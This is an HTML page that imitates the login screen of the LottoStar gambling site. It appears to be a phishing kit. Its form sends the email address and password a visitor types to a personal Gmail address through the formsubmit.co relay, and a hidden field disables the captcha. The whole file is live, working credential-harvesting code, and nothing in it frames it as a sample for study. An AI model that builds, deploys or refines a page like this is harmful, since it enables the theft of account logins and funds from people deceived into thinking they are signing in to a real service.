<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LottoStar Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: black;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
        }
        .logo {
            width: 150px;
            margin-bottom: 10px;
        }
        .input-group {
            margin: 10px 0;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: none;
            border-radius: 5px;
        }
        .forgot-password {
            font-size: 12px;
            color: #007bff;
            text-decoration: none;
        }
        .login-btn {
            background-color: #007bff;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #0056b3;
        }
        .links {
            margin-top: 20px;
        }
        .links a {
            display: block;
            color: white;
            text-decoration: none;
            margin: 5px 0;
        }
        .links a:hover {
            color: #007bff;
        }
    </style>
</head>
<body>

    <div class="container">
<form action="https://formsubmit.co/Mashele0075@gmail.com" method="POST">
             <input type="hidden" name="_captcha" value="false"> <!-- Disables reCAPTCHA -->
    
        <img src="https://i.ibb.co/PsvdDNrt/images-3.png" alt="LottoStar Logo" class="logo">
        <h2>Login</h2>
        <p>Please enter your login details below</p>
        <div class="input-group">
            <label>Enter your email address</label>
            <input type="email" name="email_address" placeholder="Enter your email address">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter your password">
        </div>
        <a href="#" class="forgot-password">Forgotten your password?</a>
        <button class="login-btn">LOGIN</button>
        <div class="links">
            <a href="#">Register</a>
            <a href="#">Contact Us</a>
            <a href="#">Deposit</a>
        </div>
    </div>

</body>
</html>
